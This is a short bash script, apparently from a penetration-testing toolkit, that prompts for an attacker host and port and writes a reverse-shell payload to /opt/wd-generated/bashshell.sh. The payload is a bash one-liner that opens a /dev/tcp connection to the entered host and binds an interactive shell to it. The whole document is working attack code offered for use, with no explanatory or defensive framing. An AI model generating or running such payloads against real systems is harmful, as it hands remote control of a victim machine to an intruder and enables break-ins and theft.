#!/bin/bash


read -p '[+] Enter LHOST : ' LHOST
read -p '[+] Enter LPORT : ' LPORT
echo "LHOST : $LHOST"
echo "LPORT : $LPORT"
echo """
#!/bin/bash
0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196
""" >> /opt/wd-generated/bashshell.sh